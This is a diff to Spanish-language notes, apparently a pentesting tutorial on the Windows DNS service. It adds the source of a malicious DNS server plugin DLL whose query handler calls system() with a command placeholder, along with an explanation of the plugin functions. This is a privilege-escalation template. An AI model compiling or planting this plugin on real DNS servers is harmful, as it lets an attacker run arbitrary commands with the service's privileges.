@@ -286,6 +286,40 @@ SERVICE_NAME: dns
 
 El texto muestra un fragmento de código (`kdns.c`) con funciones que implementa un plugin DNS. Explicación de las partes claves:
 
+```c
+/*	Benjamin DELPY `gentilkiwi`
+	https://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#include "kdns.h"
+
+DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
+{
+	return ERROR_SUCCESS;
+}
+
+DWORD WINAPI kdns_DnsPluginCleanup()
+{
+	return ERROR_SUCCESS;
+}
+
+DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
+{
+	FILE * kdns_logfile;
+#pragma warning(push)
+#pragma warning(disable:4996)
+	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
+#pragma warning(pop)
+	{
+		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
+		fclose(kdns_logfile);
+	    system("ENTER COMMAND HERE");
+	}
+	return ERROR_SUCCESS;
+}
+```
+
 * `kdns_DnsPluginInitialize(...)` y `kdns_DnsPluginCleanup()` — funciones de inicialización/limpieza que retornan `ERROR_SUCCESS` (0) para indicar que todo bien.
 * `kdns_DnsPluginQuery(...)` — función llamada por el servicio DNS cuando procesa una query. En el ejemplo:
 
